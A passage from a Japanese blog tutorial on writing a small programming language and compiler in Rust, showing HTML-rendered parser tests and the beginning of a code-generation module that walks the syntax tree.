<span id="cb33-57"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-57" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb33-58"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-58" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-59"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-59" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>test<span class="at">]</span></span>
<span id="cb33-60"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-60" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> test_block() <span class="op">{</span></span>
<span id="cb33-61"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-61" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
<span id="cb33-62"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-62" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb33-63"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-63" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-64"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-64" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> program(tokens<span class="op">:</span> <span class="op">&amp;</span>[Token]) <span class="op">-&gt;</span> <span class="dt">Option</span><span class="op">&lt;</span>(<span class="op">&amp;</span>[Token]<span class="op">,</span> Program)<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb33-65"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-65" aria-hidden="true" tabindex="-1"></a>    statements(tokens)<span class="op">.</span>map(<span class="op">|</span>(tokens<span class="op">,</span> s)<span class="op">|</span> (tokens<span class="op">,</span> <span class="pp">Program::</span>Statements(s)))</span>
<span id="cb33-66"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-66" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb33-67"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-67" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-68"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-68" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>test<span class="at">]</span></span>
<span id="cb33-69"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-69" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> test_program() <span class="op">{</span></span>
<span id="cb33-70"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-70" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(program(<span class="op">&amp;</span>[])<span class="op">,</span> <span class="cn">None</span>)<span class="op">;</span></span>
<span id="cb33-71"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-71" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-72"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-72" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb33-73"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-73" aria-hidden="true" tabindex="-1"></a>        program(<span class="op">&amp;</span>[</span>
<span id="cb33-74"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-74" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb33-75"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-75" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>PlusEq<span class="op">,</span></span>
<span id="cb33-76"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-76" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Integer(<span class="dv">123</span>)<span class="op">,</span></span>
<span id="cb33-77"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-77" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Semi<span class="op">,</span></span>
<span id="cb33-78"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-78" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb33-79"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-79" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb33-80"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-80" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb33-81"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-81" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Program::</span>Statements(<span class="pp">Statements::</span>Statement(<span class="pp">Statement::</span>Expression(</span>
<span id="cb33-82"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-82" aria-hidden="true" tabindex="-1"></a>                <span class="pp">Expression::</span>AssignAdd(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="dv">123</span>))</span>
<span id="cb33-83"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-83" aria-hidden="true" tabindex="-1"></a>            )))</span>
<span id="cb33-84"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-84" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb33-85"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-85" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb33-86"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-86" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb33-87"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-87" aria-hidden="true" tabindex="-1"></a>    <span class="pp">assert_eq!</span>(</span>
<span id="cb33-88"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-88" aria-hidden="true" tabindex="-1"></a>        program(<span class="op">&amp;</span>[</span>
<span id="cb33-89"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-89" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb33-90"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-90" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>PlusEq<span class="op">,</span></span>
<span id="cb33-91"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-91" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Integer(<span class="dv">123</span>)<span class="op">,</span></span>
<span id="cb33-92"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-92" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Semi<span class="op">,</span></span>
<span id="cb33-93"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-93" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Star<span class="op">,</span></span>
<span id="cb33-94"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-94" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Identifier(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb33-95"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-95" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>PlusEq<span class="op">,</span></span>
<span id="cb33-96"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-96" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Integer(<span class="dv">123</span>)<span class="op">,</span></span>
<span id="cb33-97"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-97" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Token::</span>Semi<span class="op">,</span></span>
<span id="cb33-98"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-98" aria-hidden="true" tabindex="-1"></a>        ])<span class="op">,</span></span>
<span id="cb33-99"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-99" aria-hidden="true" tabindex="-1"></a>        <span class="cn">Some</span>((</span>
<span id="cb33-100"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-100" aria-hidden="true" tabindex="-1"></a>            <span class="op">&amp;</span>[] <span class="kw">as</span> <span class="op">&amp;</span>[Token]<span class="op">,</span></span>
<span id="cb33-101"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-101" aria-hidden="true" tabindex="-1"></a>            <span class="pp">Program::</span>Statements(<span class="pp">Statements::</span>Statements(</span>
<span id="cb33-102"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-102" aria-hidden="true" tabindex="-1"></a>                <span class="dt">Box</span><span class="pp">::</span>new(<span class="pp">Statements::</span>Statement(<span class="pp">Statement::</span>Expression(</span>
<span id="cb33-103"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-103" aria-hidden="true" tabindex="-1"></a>                    <span class="pp">Expression::</span>AssignAdd(<span class="pp">Lhs::</span><span class="bu">Pointer</span>(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span> <span class="pp">Rhs::</span>Number(<span class="dv">123</span>))</span>
<span id="cb33-104"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-104" aria-hidden="true" tabindex="-1"></a>                )))<span class="op">,</span></span>
<span id="cb33-105"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-105" aria-hidden="true" tabindex="-1"></a>                <span class="pp">Statement::</span>Expression(<span class="pp">Expression::</span>AssignAdd(</span>
<span id="cb33-106"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-106" aria-hidden="true" tabindex="-1"></a>                    <span class="pp">Lhs::</span>Dereference(<span class="st">&quot;hoge&quot;</span><span class="op">.</span>to_owned())<span class="op">,</span></span>
<span id="cb33-107"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-107" aria-hidden="true" tabindex="-1"></a>                    <span class="pp">Rhs::</span>Number(<span class="dv">123</span>)</span>
<span id="cb33-108"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-108" aria-hidden="true" tabindex="-1"></a>                ))</span>
<span id="cb33-109"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-109" aria-hidden="true" tabindex="-1"></a>            ))</span>
<span id="cb33-110"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-110" aria-hidden="true" tabindex="-1"></a>        ))</span>
<span id="cb33-111"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-111" aria-hidden="true" tabindex="-1"></a>    )<span class="op">;</span></span>
<span id="cb33-112"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb33-112" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>これで <code>program()</code> にトークン列を渡すことで構文木を組み立てることができるようになりました。ちなみに今回のトークン列 <code>tokens</code> を連れ回す実装をもっといい感じに書けないのかなーと思った方はぜひ “Monadic Parsing” などと検索してみましょう。きっとまた新しいプログラミングの世界に出会えるはずです。</p>
<h2 id="構文木からコードを生成する">構文木からコードを生成する</h2>
<p>構文木を作れるようになったので、今度は構文木に対応するコードを出力できるようにしていきます。<a href="https://github.com/Tosainu/chiya/blob/b299a566dd45e919ff42dbf879e684ed641843ef/src/codegen.rs"><code>src/codegen.rs</code></a> にこんな感じの実装を追加しました。関数 <code>gen()</code> で構文木を <code>Program</code> からたどっていき、必要な箇所で <code>Emitter</code> の各種メソッドを呼び出してコードを生成したり、生成されたコードを結合したりする感じです。</p>
<div class="sourceCode" id="cb34"><pre class="sourceCode rust"><code class="sourceCode rust"><span id="cb34-1"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="kw">use</span> <span class="kw">crate</span><span class="pp">::parser::</span><span class="op">{</span>Block<span class="op">,</span> Expression<span class="op">,</span> Lhs<span class="op">,</span> Program<span class="op">,</span> Rhs<span class="op">,</span> Statement<span class="op">,</span> Statements<span class="op">};</span></span>
<span id="cb34-2"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-3"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-3" aria-hidden="true" tabindex="-1"></a><span class="at">#[</span>derive<span class="at">(</span><span class="bu">Debug</span><span class="op">,</span> <span class="bu">PartialEq</span><span class="op">,</span> <span class="pp">failure::</span>Fail<span class="at">)]</span></span>
<span id="cb34-4"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">enum</span> CodegenError <span class="op">{</span></span>
<span id="cb34-5"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">#[</span>fail<span class="at">(</span>display <span class="op">=</span> <span class="st">&quot;invalid variable name: '{}'&quot;</span><span class="op">,</span> name<span class="at">)]</span></span>
<span id="cb34-6"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-6" aria-hidden="true" tabindex="-1"></a>    InvalidVariableName <span class="op">{</span> name<span class="op">:</span> <span class="dt">String</span> <span class="op">},</span></span>
<span id="cb34-7"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-8"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-8" aria-hidden="true" tabindex="-1"></a>    <span class="at">#[</span>fail<span class="at">(</span>display <span class="op">=</span> <span class="st">&quot;invalid function name: '{}'&quot;</span><span class="op">,</span> name<span class="at">)]</span></span>
<span id="cb34-9"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-9" aria-hidden="true" tabindex="-1"></a>    InvalidFunctionName <span class="op">{</span> name<span class="op">:</span> <span class="dt">String</span> <span class="op">},</span></span>
<span id="cb34-10"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-11"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-11" aria-hidden="true" tabindex="-1"></a>    <span class="at">#[</span>fail<span class="at">(</span>display <span class="op">=</span> <span class="st">&quot;not implemented&quot;</span><span class="at">)]</span></span>
<span id="cb34-12"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-12" aria-hidden="true" tabindex="-1"></a>    NotImplemented<span class="op">,</span></span>
<span id="cb34-13"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb34-14"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-15"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-15" aria-hidden="true" tabindex="-1"></a><span class="kw">pub</span> <span class="kw">fn</span> gen<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span> tree<span class="op">:</span> <span class="op">&amp;</span>Program) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb34-16"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-16" aria-hidden="true" tabindex="-1"></a>    <span class="cf">match</span> tree <span class="op">{</span></span>
<span id="cb34-17"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-17" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Program::</span>Statements(ss) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb34-18"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-18" aria-hidden="true" tabindex="-1"></a>            <span class="kw">let</span> header <span class="op">=</span> emitter<span class="op">.</span>emit_header()<span class="op">;</span></span>
<span id="cb34-19"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-19" aria-hidden="true" tabindex="-1"></a>            <span class="kw">let</span> body <span class="op">=</span> statements(emitter<span class="op">,</span> ss)<span class="op">?;</span></span>
<span id="cb34-20"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-20" aria-hidden="true" tabindex="-1"></a>            <span class="kw">let</span> footer <span class="op">=</span> emitter<span class="op">.</span>emit_footer()<span class="op">;</span></span>
<span id="cb34-21"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-21" aria-hidden="true" tabindex="-1"></a>            <span class="cn">Ok</span>(<span class="pp">format!</span>(<span class="st">&quot;{}{}{}&quot;</span><span class="op">,</span> header<span class="op">,</span> body<span class="op">,</span> footer))</span>
<span id="cb34-22"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-22" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
<span id="cb34-23"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-23" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb34-24"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-24" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb34-25"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-26"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-26" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> statements<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(</span>
<span id="cb34-27"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-27" aria-hidden="true" tabindex="-1"></a>    emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span></span>
<span id="cb34-28"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-28" aria-hidden="true" tabindex="-1"></a>    tree<span class="op">:</span> <span class="op">&amp;</span>Statements<span class="op">,</span></span>
<span id="cb34-29"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-29" aria-hidden="true" tabindex="-1"></a>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb34-30"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-30" aria-hidden="true" tabindex="-1"></a>    <span class="cf">match</span> tree <span class="op">{</span></span>
<span id="cb34-31"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-31" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Statements::</span>Statement(s) <span class="op">=&gt;</span> statement(emitter<span class="op">,</span> s)<span class="op">,</span></span>
<span id="cb34-32"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-32" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Statements::</span>Statements(ss<span class="op">,</span> s) <span class="op">=&gt;</span> statements(emitter<span class="op">,</span> ss)</span>
<span id="cb34-33"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-33" aria-hidden="true" tabindex="-1"></a>            <span class="op">.</span>and_then(<span class="op">|</span>s0<span class="op">|</span> statement(emitter<span class="op">,</span> s)<span class="op">.</span>map(<span class="op">|</span>s1<span class="op">|</span> <span class="pp">format!</span>(<span class="st">&quot;{}{}&quot;</span><span class="op">,</span> s0<span class="op">,</span> s1)))<span class="op">,</span></span>
<span id="cb34-34"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-34" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb34-35"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-35" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb34-36"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-37"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-37" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> statement<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(</span>
<span id="cb34-38"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-38" aria-hidden="true" tabindex="-1"></a>    emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span></span>
<span id="cb34-39"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-39" aria-hidden="true" tabindex="-1"></a>    tree<span class="op">:</span> <span class="op">&amp;</span>Statement<span class="op">,</span></span>
<span id="cb34-40"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-40" aria-hidden="true" tabindex="-1"></a>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb34-41"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-41" aria-hidden="true" tabindex="-1"></a>    <span class="cf">match</span> tree <span class="op">{</span></span>
<span id="cb34-42"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-42" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Statement::</span>Expression(e) <span class="op">=&gt;</span> expression(emitter<span class="op">,</span> e)<span class="op">,</span></span>
<span id="cb34-43"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-43" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Statement::</span>Block(b) <span class="op">=&gt;</span> block(emitter<span class="op">,</span> b)<span class="op">,</span></span>
<span id="cb34-44"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-44" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Statement::</span>While(e<span class="op">,</span> b) <span class="op">=&gt;</span> while_s(emitter<span class="op">,</span> e<span class="op">,</span> b)<span class="op">,</span></span>
<span id="cb34-45"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-45" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb34-46"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-46" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb34-47"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-47" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-48"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-48" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> block<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span> tree<span class="op">:</span> <span class="op">&amp;</span>Block) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb34-49"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-49" aria-hidden="true" tabindex="-1"></a>    <span class="cf">match</span> tree <span class="op">{</span></span>
<span id="cb34-50"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-50" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Block::</span>Statements(ss) <span class="op">=&gt;</span> statements(emitter<span class="op">,</span> ss)<span class="op">,</span></span>
<span id="cb34-51"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-51" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb34-52"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-52" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb34-53"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-53" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-54"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-54" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> expression<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(</span>
<span id="cb34-55"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-55" aria-hidden="true" tabindex="-1"></a>    emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span></span>
<span id="cb34-56"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-56" aria-hidden="true" tabindex="-1"></a>    tree<span class="op">:</span> <span class="op">&amp;</span>Expression<span class="op">,</span></span>
<span id="cb34-57"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-57" aria-hidden="true" tabindex="-1"></a>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb34-58"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-58" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
<span id="cb34-59"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-59" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb34-60"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-60" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-61"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-61" aria-hidden="true" tabindex="-1"></a><span class="kw">fn</span> while_s<span class="op">&lt;</span>E<span class="op">:</span> <span class="pp">emitter::</span>Emitter<span class="op">&gt;</span>(</span>
<span id="cb34-62"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-62" aria-hidden="true" tabindex="-1"></a>    emitter<span class="op">:</span> <span class="op">&amp;</span><span class="kw">mut</span> E<span class="op">,</span></span>
<span id="cb34-63"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-63" aria-hidden="true" tabindex="-1"></a>    cond<span class="op">:</span> <span class="op">&amp;</span>Expression<span class="op">,</span></span>
<span id="cb34-64"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-64" aria-hidden="true" tabindex="-1"></a>    body<span class="op">:</span> <span class="op">&amp;</span>Block<span class="op">,</span></span>
<span id="cb34-65"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-65" aria-hidden="true" tabindex="-1"></a>) <span class="op">-&gt;</span> <span class="dt">Result</span><span class="op">&lt;</span><span class="dt">String</span><span class="op">,</span> CodegenError<span class="op">&gt;</span> <span class="op">{</span></span>
<span id="cb34-66"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-66" aria-hidden="true" tabindex="-1"></a>    <span class="cf">match</span> cond <span class="op">{</span></span>
<span id="cb34-67"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-67" aria-hidden="true" tabindex="-1"></a>        <span class="pp">Expression::</span>Lhs(<span class="pp">Lhs::</span>Dereference(ptr)) <span class="op">=&gt;</span> <span class="op">{</span></span>
<span id="cb34-68"><a href="https://blog.myon.info/entry/2019/10/21/make-own-language-and-compiler/#cb34-68" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> ptr <span class="op">!=</span> <span class="st">&quot;ptr&quot;</span> <span class="op">{</span></span>
